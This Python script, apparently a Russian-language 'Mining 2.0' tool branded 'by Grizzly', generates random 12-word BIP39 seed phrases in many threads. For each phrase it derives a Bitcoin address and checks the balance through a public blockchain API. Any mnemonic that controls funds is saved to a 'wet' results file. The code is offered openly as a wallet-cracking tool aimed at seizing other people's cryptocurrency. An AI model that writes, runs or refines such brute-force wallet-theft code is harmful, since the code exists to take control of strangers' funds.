import pprint
import mnemonic
import bip32utils
import requests
import random
import os
from decimal import Decimal
import threading
from Bip39Gen import Bip39Gen
from time import sleep
import ctypes
from bs4 import BeautifulSoup


class Settings():
    save_empty = "y"
    total_count = 0
    wet_count = 0
    dry_count = 0


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def userInput():
    print('Программа залупа, крякнул гризли')
    start()




def getInternet():
    try:
        try:
            requests.get('https://www.google.com')
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance(addr):
    try:
        response = requests.get(
            f'https://api.smartbit.com.au/v1/blockchain/address/{addr}')
        return (
            Decimal(response.json()["address"]["total"]["balance"])
        )
    except:
        pass


def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
            random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def check():

    while True:
        try:
            mnemonic_words = Bip39Gen(dictionary).mnemonic
            addy = bip39(mnemonic_words)
            balance = getBalance(addy)
            with lock:
                print(
                    f'[by Grizzly]Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}')
                Settings.total_count += 1
                if Settings.save_empty == "y":
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Mining 2.0 [by rGizzly] - С балансом: {Settings.wet_count} - Всего проверок: {Settings.total_count}")
                else:
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Mining 2.0 [by Grizzly] - С балансом: {Settings.wet_count} - Всего проверок: {Settings.total_count}")
            if balance > 0:
                with open('results/wet [by Grizzly].txt', 'a') as w:
                    w.write(
                        f'[by Grizzly]Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                    Settings.wet_count += 1
            else:
                if Settings.save_empty == "n":
                    pass
                else:
                    with open('results/dry [by Grizzly].txt', 'a') as w:
                        w.write(
                            f'[by Grizzly]Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                        Settings.dry_count += 1
        except: continue


def helpText():
    print("""
За помощью НЕ обращайтесь к t.me/btc_farm_pro, софт хуйня
        """)


def start():
    try:
        threads = int(input("Выбери количество потоков: "))
    except ValueError:
        print("Что-то не то")
        start()
    Settings.save_empty = input("Сохранять пустые? (y/n): ").lower()
    if getInternet() == True:
        threads_ = []
        for i, _ in enumerate(range(threads), 1):
            thread = threading.Thread(target = check, args = (),)
            threads_.append(thread)
            thread.start()
            if i % 100 == 0:
                sleep(10)
                for j in threads_: j.join()
    else:
        print("Told ya")
        userInput()


if __name__ == '__main__':
    makeDir()
    getInternet()
    if getInternet() == False:
        print("Без интернета не получится :С")
    else:
        pass
    userInput()
